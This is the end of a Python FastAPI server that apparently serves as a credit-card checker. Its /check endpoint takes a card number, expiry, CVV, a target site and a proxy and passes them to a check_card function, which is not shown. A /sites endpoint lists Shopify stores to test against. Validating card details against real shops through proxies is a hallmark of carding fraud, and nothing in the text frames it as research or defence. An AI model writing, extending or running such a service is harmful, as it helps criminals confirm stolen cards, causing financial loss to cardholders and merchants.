@app.post("/check")
async def check(req: CheckRequest):
    if len(req.yy) == 4:
        req.yy = req.yy[2:]
    req.mm = req.mm.zfill(2)
    
    result = await check_card(req.cc, req.mm, req.yy, req.cvv, site=req.site, proxy=req.proxy)
    return result

@app.get("/sites")
async def get_sites():
    return {"sites": SHOPIFY_SITES, "count": len(SHOPIFY_SITES)}


if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 8080))
    uvicorn.run(app, host="0.0.0.0", port=port)